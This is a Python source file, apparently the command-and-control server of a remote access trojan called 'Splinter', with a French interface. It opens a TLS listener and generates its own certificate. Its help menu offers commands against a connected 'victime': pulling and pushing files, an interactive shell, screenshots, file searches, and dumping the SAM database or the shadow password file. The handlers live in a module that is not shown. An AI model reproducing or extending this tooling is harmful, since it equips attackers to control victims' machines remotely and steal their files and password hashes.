import socket 
import ssl
import subprocess
import socket 
import os
from command import handle_command
from colorama import Fore, Style, init


def colorama_etoile():
    etoile = Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "*" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "
    return etoile
def colorama_plus():
    plus = Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "+" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "
    return plus

def show_help():
    help_text = print(f"""{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}                                        _   _      _       
                                       | | | | ___| |_ __  
                                       | |_| |/ _ \ | '_ \ 
                                       |  _  |  __/ | |_) |
                                       |_| |_|\___|_| .__/ 
                                                    |_|    
{Style.RESET_ALL}{Fore.RED}{Style.DIM}
=================================================================================================

Voici la liste des commandes disponible sur {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}Splinter{Style.RESET_ALL}{Fore.RED}{Style.DIM} : 

=================================================================================================
                                                   
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}help{Style.RESET_ALL}{Fore.RED}{Style.DIM} : afficher la liste des commandes disponibles.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}download [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers de la victime vers le serveur.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}upload [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers du serveur vers la victime.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}shell{Style.RESET_ALL}{Fore.RED}{Style.DIM} : ouvrir un shell (bash ou cmd) interactif.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}ipconfig{Style.RESET_ALL}{Fore.RED}{Style.DIM} : obtenir la configuration réseau de la machine victime.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}screenshot{Style.RESET_ALL}{Fore.RED}{Style.DIM} : prendre une capture d'écran de la machine victime.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}search [mot a rechercher] [chemin de recherche]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : rechercher un fichier sur la machine victime.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}hashdump{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupérer la base SAM ou le fichier shadow de la machine.

=================================================================================================            
                 """)

def create_client_directory(client_ip):
    directory_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), client_ip)
    if not os.path.exists(directory_path):
        os.makedirs(directory_path)
    return directory_path


def create_server(port, certfile, keyfile):
    try:
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile, keyfile)

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
            sock.bind(('0.0.0.0', port))
            sock.listen(5)
            with context.wrap_socket(sock, server_side=True) as ssock:
                print(f"\n{colorama_etoile()}En écoute sur le port : {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{port}{Style.RESET_ALL}{Fore.RED}{Style.DIM}...")
                conn, addr = ssock.accept()
                client_ip = addr[0]  # Récupère l'adresse IP du client
                client_directory = create_client_directory(client_ip)
                os_type = conn.recv(1024).decode('utf-8')
                print(f"{colorama_plus()}Connexion reçue de : {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{addr}{Style.RESET_ALL}{Fore.RED}{Style.DIM} !")
                print(f"{colorama_etoile()}Type d'OS du client : {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{os_type}{Style.RESET_ALL}{Fore.RED}{Style.DIM}\n\n=================================================================================================\n")
                show_help()
                while True:
                    cmd = input(colorama_etoile() + "Splinter " + Style.RESET_ALL + Fore.GREEN + Style.DIM + "> " + Style.RESET_ALL + Fore.RED + Style.DIM)
                    if cmd == "exit":
                        conn.close()
                        break
                    handle_command(conn,cmd,client_directory)
    except ssl.SSLError as e:
        print(f"Erreur SSL : {e}")
    except socket.error as e:
        print(f"Erreur de Socket : {e}")
    except Exception as e:
        print(f"Erreur inattendue : {e}")

#Obtention de l'adresse IP de l'utilisateur
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(f"Erreur lors de la récupération de l'adresse IP : {e}")
        return None

# Création du certificat
def setup_ssl_certificates(cert_file, key_file, config_file):
    local_ip = get_local_ip()
    print(Fore.RED + Style.DIM + "Voici l'IP que Splinter a récupérée : " + Style.RESET_ALL + Fore.GREEN + Style.DIM + local_ip + Style.RESET_ALL + Fore.RED + Style.DIM +"\n\n=================================================================================================") 
    if not local_ip:
        print(Fore.RED + Style.DIM + "Impossible de déterminer l'adresse IP locale. Abandon de la création du certificat.")
        return

    script_dir = os.path.dirname(os.path.realpath(__file__))
    full_cert_path = os.path.join(script_dir, cert_file)
    full_key_path = os.path.join(script_dir, key_file)
    full_config_path = os.path.join(script_dir, config_file)

    print("\n" + colorama_etoile() + "Check du certificat SSL en cours...")
    if not (os.path.isfile(full_cert_path) and os.path.isfile(full_key_path)):
        print(colorama_etoile() + "Certificat SSL ou clé privée manquante, création en cours...")
        with open(full_config_path, "w") as config_file:
            config_file.write(f"""[req]
default_bits = 2048
prompt = no
default_md = sha256
req_extensions = req_ext
distinguished_name = dn

[dn]
C=XX
ST=XX
L=XX
O=XX
OU=XX
emailAddress=xx@xx.com
CN = {local_ip}

[req_ext]
subjectAltName = @alt_names

[alt_names]
IP.1 = {local_ip}
""")
        openssl_cmd = f"openssl req -new -x509 -nodes -days 365 -newkey rsa:2048 -keyout {full_key_path} -out {full_cert_path} -config {full_config_path}"
        subprocess.run(openssl_cmd, shell=True, check=True)
        print(colorama_etoile() + "Certificat SSL et clé privée créés")
    else:
        print(colorama_etoile() + "Certificat SSL et clé privée existants utilisés" + Style.RESET_ALL + Fore.RED + Style.DIM +"\n\n=================================================================================================")
